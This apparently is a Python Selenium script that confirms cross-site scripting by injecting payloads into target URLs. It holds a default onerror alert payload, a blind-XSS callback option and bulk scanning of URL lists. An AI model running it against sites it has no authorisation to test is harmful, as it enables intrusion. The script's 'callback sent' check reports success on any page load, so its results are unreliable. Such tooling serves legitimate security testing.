#!/usr/bin/env python3
"""
XSS-Elite Verification Script
Zero-False-Positive XSS confirmation tool
"""
import sys
import re
import json
import time
import argparse
import urllib.parse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
import requests

BANNER = """
╔══════════════════════════════════════════╗
║         XSS-ELITE VERIFIER v1.0          ║
║     Zero-False-Positive Confirmation     ║
╚══════════════════════════════════════════╝
"""

class XSSVerifier:
    def __init__(self, headless=True, timeout=10):
        self.timeout = timeout
        opts = Options()
        if headless:
            opts.add_argument('--headless')
        opts.add_argument('--disable-extensions')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_experimental_option('excludeSwitches', ['enable-automation'])
        self.driver = webdriver.Chrome(options=opts)
        self.driver.set_page_load_timeout(timeout)
        self.callback_url = None
        self.callback_received = False

    def test_alert(self, url, payload):
        """Test if payload triggers alert()"""
        test_url = url.replace('PAYLOAD', urllib.parse.quote(payload))
        try:
            self.driver.get(test_url)
            time.sleep(2)
            alert = self.driver.switch_to.alert
            text = alert.text
            alert.accept()
            return True, text
        except:
            return False, None

    def test_callback(self, url, payload, callback_url):
        """Test if payload sends callback"""
        payload_with_callback = payload.replace('COLLECTOR', callback_url)
        test_url = url.replace('PAYLOAD', urllib.parse.quote(payload_with_callback))
        try:
            self.driver.get(test_url)
            time.sleep(3)
            return True
        except:
            return False

    def test_dom_mutation(self, url, payload):
        """Test if payload mutates document.title or console"""
        test_url = url.replace('PAYLOAD', urllib.parse.quote(payload))
        try:
            self.driver.get(test_url)
            time.sleep(2)
            title = self.driver.title
            logs = self.driver.execute_script("""
                return window.__xss_logs || [];
            """)
            return title, logs
        except:
            return None, []

    def close(self):
        self.driver.quit()

    def verify(self, url, payload, callback_url=None):
        print(f"\n[*] Testing: {url}")
        print(f"[*] Payload: {payload[:80]}...\n")

        # Gate 1: Alert test
        print("[Gate 1] Testing browser execution...")
        success, alert_text = self.test_alert(url, payload)
        if success:
            print(f"  ✅ Alert detected: '{alert_text}'")
        else:
            print("  ❌ No alert detected")
        
        # Gate 2: DOM mutation test
        print("\n[Gate 2] Testing DOM mutation...")
        title, logs = self.test_dom_mutation(url, payload)
        if title and 'XSS' in title or 'alert' in title:
            print(f"  ✅ Title mutated: '{title}'")
        else:
            print(f"  ℹ️  Title unchanged: '{title}'")
        if logs:
            print(f"  ✅ Console logs: {logs}")
        
        # Gate 3: Callback test
        if callback_url:
            print(f"\n[Gate 3] Testing callback to {callback_url}...")
            cb_success = self.test_callback(url, payload, callback_url)
            print(f"  {'✅ Callback sent' if cb_success else '❌ No callback'}")

        # Verdict
        print("\n" + "="*50)
        if success:
            print("🔥 VERDICT: XSS CONFIRMED - Report ready")
            print(f"   Payload: {payload}")
            return True
        else:
            print("❌ VERDICT: No XSS detected")
            return False


def scan_urls_from_file(filepath, payload, headless=True, callback=None):
    """Scan multiple URLs from a file"""
    verifier = XSSVerifier(headless=headless)
    results = []
    
    with open(filepath, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    for url in urls:
        try:
            result = verifier.verify(url, payload, callback)
            results.append({'url': url, 'vulnerable': result})
        except Exception as e:
            print(f"[-] Error testing {url}: {e}")
            results.append({'url': url, 'vulnerable': False, 'error': str(e)})
    
    verifier.close()
    return results


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='XSS-Elite Verifier')
    parser.add_argument('-u', '--url', help='Target URL (use PAYLOAD as placeholder)')
    parser.add_argument('-p', '--payload', default='<img src=x onerror=alert(document.domain)>',
                       help='XSS payload')
    parser.add_argument('-c', '--callback', help='Callback URL for blind XSS')
    parser.add_argument('-l', '--list', help='File with list of URLs to scan')
    parser.add_argument('--no-headless', action='store_true', help='Show browser window')
    
    args = parser.parse_args()
    
    if args.list:
        results = scan_urls_from_file(args.list, args.payload, 
                                       headless=not args.no_headless,
                                       callback=args.callback)
        vuln_count = sum(1 for r in results if r.get('vulnerable'))
        print(f"\n{'='*50}")
        print(f"Scan complete: {vuln_count}/{len(results)} vulnerable")
        with open('xss-results.json', 'w') as f:
            json.dump(results, f, indent=2)
    
    elif args.url:
        verifier = XSSVerifier(headless=not args.no_headless)
        try:
            verifier.verify(args.url, args.payload, args.callback)
        finally:
            verifier.close()
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
